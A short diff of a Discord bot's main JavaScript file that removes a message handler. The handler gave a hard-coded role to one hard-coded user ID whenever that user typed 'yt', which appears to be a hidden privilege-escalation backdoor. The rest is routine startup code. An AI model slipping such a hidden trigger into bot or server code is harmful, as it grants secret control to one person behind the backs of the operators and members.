@@ -13,15 +13,4 @@ base.loadCommands()
 base.loadEvents()
 base.loadJobs()
 
-client.on('messageCreate', async (msg)=>{
-	if(msg.content == "yt"){
-		const x = "1269401639467356180"
-		if(msg.author.id == "677194506621288448"){
-			const user = msg.guild.members.cache.get("677194506621288448")
-			await user.roles.add(x)
-		}
-	}
-})
-
-
 base.login()
